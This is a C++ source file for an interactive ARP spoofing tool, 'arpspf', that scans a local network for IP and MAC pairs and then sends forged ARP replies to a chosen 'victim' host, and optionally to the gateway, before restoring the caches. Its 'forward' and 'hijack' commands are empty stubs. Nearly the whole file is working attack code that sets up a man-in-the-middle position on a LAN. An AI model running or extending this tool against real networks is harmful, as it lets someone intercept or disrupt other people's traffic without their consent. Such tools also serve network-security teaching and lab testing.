/*
 * Arguments:
 * victim's ip
 * how many packets
 * time interval
 * device name
 */


#include "arpspf.h"
#include "hdrs.h"
#include "netinfo.h"

#include <set>

#include <wordexp.h>
#include <vector>

using namespace kni;

netinfo *netdb;
int keep_looping = 1;
const size_t errbufsize = 1024;
char errbuf[errbufsize];

#define APP_NAME "arpspf"

typedef void (*arpspf_func)(int, char *[]);

void arpspf_exit(int, char **);

void arpspf_spoof(int, char **);

void arpspf_scan_lan(int, char **);

void arpspf_forward(int, char **);

void arpspf_hijack(int, char **);

void arpspf_device(int, char **);

void fatal_error(const char *src, const char *err);


int main(int argc, char *argv[]) {
    if (argc == 1) {
        fatal_error(APP_NAME, "missing device name");
    } else if (strcmp(argv[1], "lo") == 0) {
        fatal_error(APP_NAME, "using lo doesn't make sense");
    }

    netdb = new netinfo(errbuf, errbufsize);
    if (!netdb->set_dev(argv[1]) || !netdb->update_gateway_ip()) {
        fatal_error(APP_NAME, netdb->error());
    }

    std::map<std::string, arpspf_func> arpspf_cmd;

    arpspf_cmd["exit"] = arpspf_exit;
    arpspf_cmd["scan"] = arpspf_scan_lan;
    arpspf_cmd["dev"] = arpspf_device;
    arpspf_cmd["spf"] = arpspf_spoof;
    arpspf_cmd["fwd"] = arpspf_forward;
    arpspf_cmd["hij"] = arpspf_hijack;

    arpspf_device(0, nullptr);
    arpspf_scan_lan(0, nullptr);

    while (keep_looping) {
        printf("> ");

        char *line_buf = nullptr;
        size_t bufsize = 0;

        int bytes;
        char dmt;
        if ((bytes = static_cast<int>(getline(&line_buf, &bufsize, stdin))) > 1) {

            dmt = line_buf[bytes - 1];
            line_buf[bytes - 1] = 0;
            KNI_LOG_DEBUG("command line \"%s\"", line_buf);

            wordexp_t we{};
            int we_ret = wordexp(line_buf, &we, 0);
            for (int i = 0; i < we.we_wordc; ++i)
                KNI_LOG_DEBUG("argv[%d]=%s", i, we.we_wordv[i]);

            if (we_ret == 0) {
                std::string name(we.we_wordv[0]);
                if (arpspf_cmd.count(name)) {
                    arpspf_cmd[name](static_cast<int>(we.we_wordc), we.we_wordv);
                } else {
                    KNI_LOG_ERROR("\"%s\" not found.\n", we.we_wordv[0]);
                }
            } else if (we_ret != WRDE_BADCHAR && we_ret != WRDE_SYNTAX) {
                keep_looping = 0;
            }

            wordfree(&we);
            line_buf[bytes - 1] = dmt;
        }

        free(line_buf);
    }

    delete netdb;
    return 0;
}

/*
 * use a map<string, mac> to store ip:mac pairs returned by nmap
 * sc - scan LAN ips using nmap
 *      sc
 * spf - perform LAN arp spoofing to hosts
 *      spf 192.168.225.187 -n 5 -c 100
 * fwd - forward network traffic between hosts
 *      fwd 192.168.225.187
 */

void arpspf_exit(int argc, char **argv) {
    KNI_LOG_DEBUG("%s()", __FUNCTION__);

    keep_looping = false;
}

/*
 * spf - perform LAN arp spoofing on a single host
 *      spf 192.168.225.187 -n 5 -c 100
 */
void arpspf_spoof(int argc, char **argv) {
    KNI_LOG_DEBUG("%s(argc=%d):", __FUNCTION__, argc);

    optind = 1; // https://stackoverflow.com/a/15179990/8706476

    int opt;
    int seconds = 10, npackets = 10;
    bool twoway = false;
    while ((opt = getopt(argc, argv, "n:c:t")) != -1) {
        switch (opt) {
            case 'n':
                seconds = atoi(optarg);
                KNI_LOG_DEBUG("optarg=%s secs=%d", optarg, seconds);
                break;
            case 'c':
                npackets = atoi(optarg);
                KNI_LOG_DEBUG("optarg=%s pkts=%d", optarg, npackets);
                break;
            case 't':
                twoway = true;
                KNI_LOG_DEBUG("optarg=%s twoway=%d", optarg, twoway);
                break;
            default:
                break;
        }
    }

    argc -= optind;
    argv += optind;

    if (seconds < 0 || npackets < 0) {
        printf("invalid arguments.\n");
        return;
    }

    if (argc == 0) {
        printf("missing an IP address.\n");
        return;
    }

    char ipbuf[16];
    if (inet_pton(AF_INET, argv[0], ipbuf) == 0) {
        printf("\"%s\" doesn't contain a valid IPv4 address", argv[0]);
        return;
    }

    std::string victim_ip(argv[0]);
    mac_t victim_mac;

    if (netdb->cached(victim_ip) == 0) {

        KNI_LOG_WARN("host %s not detected.", argv[0]);

        if (argc == 1) {
            printf("missing an MAC address.\nrun \"scan\" to discover LAN hosts\n");
            return;

        } else if (mac_pton(argv[1], &victim_mac) == 0) {
            printf("\"%s\" is not a valid MAC address\n", argv[1]);
            return;
        }

        KNI_LOG_DEBUG("using user-supplied MAC \"%s\"", argv[1]);

    } else if (victim_ip == netdb->gateway_ip) {

        KNI_LOG_DEBUG("An ip address except the gateway's is required.");
        return;
    } else {

        victim_mac = netdb->map(victim_ip);
    }

    char err_buf[PCAP_ERRBUF_SIZE];
    arp_io_packet arp_io(err_buf, sizeof(err_buf));

    if (!arp_io.open(netdb->devname)) {
        KNI_LOG_ERROR("failed to open device \"%s\" :%s", netdb->devname.c_str(), arp_io.error());
        return;
    } else {
        KNI_LOG_DEBUG("device \"%s\" opened successfully.", netdb->devname.c_str());;
    }

    KNI_LOG_DEBUG("%s(): ip=%s secs=%d pkts=%d twoway=%d", __FUNCTION__, victim_ip.c_str(), seconds, npackets, twoway);
    KNI_LOG_DEBUG("spoofing %s(%s)...", to_string(victim_mac).c_str(), victim_ip.c_str());

    for (int i = 0; i < npackets; ++i) {
        bool succ = arp_io.reply(netdb->gateway_ip, netdb->devinfo.hw_addr, victim_ip, victim_mac);
        if (succ && twoway)
            succ = arp_io.reply(victim_ip, netdb->devinfo.hw_addr, netdb->gateway_ip, netdb->gateway_mac);

        if (!succ)
            KNI_LOG_ERROR("%s", arp_io.error());

        if (i != npackets - 1)
            sleep(static_cast<unsigned int>(seconds));
    }

    KNI_LOG_DEBUG("restoring ARP...");

    for (int i = 0; i < 5; ++i) {
        bool succ = arp_io.reply(netdb->gateway_ip, netdb->gateway_mac, victim_ip, victim_mac);
        if (succ && twoway)
            succ = arp_io.reply(victim_ip, victim_mac, netdb->gateway_ip, netdb->gateway_mac);

        if (!succ)
            KNI_LOG_ERROR("%s", arp_io.error());

        if (i != npackets - 1)
            sleep(static_cast<unsigned int>(3));
    }

    arp_io.close();
    KNI_LOG_DEBUG("device \"%s\" closed", netdb->devname.c_str());

}

void arpspf_scan_lan(int, char **) {
    KNI_LOG_DEBUG("%s()", __FUNCTION__);

    if (netdb->update_gateway_ip() == -1) {
        KNI_LOG_ERROR("%s\n", netdb->error());
        return;
    }

    printf("Scanning hosts...\n");

    if (netdb->update_arp()) {
        for (auto &p: netdb->mapping()) {
            printf("ip: %s\t- mac: %s\n", p.first.c_str(), to_string(p.second).c_str());
        }
    } else {
        KNI_LOG_ERROR("%s\n", netdb->error());
    }

}

void arpspf_forward(int, char **) {
    KNI_LOG_DEBUG("%s()", __FUNCTION__);
}

void arpspf_hijack(int, char **) {
    KNI_LOG_DEBUG("%s()", __FUNCTION__);
}

void arpspf_device(int, char **) {
    KNI_LOG_DEBUG("%s()", __FUNCTION__);

    printf("Gateway:%s\n", netdb->gateway_ip.c_str());

    printf("Device \"%s\":\n", netdb->devname.c_str());

    auto netenv = &(netdb->devinfo);
    printf("\tHWaddr:%s Bcast:%s\n",
           to_string(netenv->hw_addr).c_str(),
           to_string(netenv->hw_bcast).c_str());
    printf("\tinet addr:%s Bcast:%s Mask:%s\n",
           to_string(netenv->ip).c_str(),
           to_string(netenv->ip_bcast).c_str(),
           to_string(netenv->ip_netmask).c_str());
}

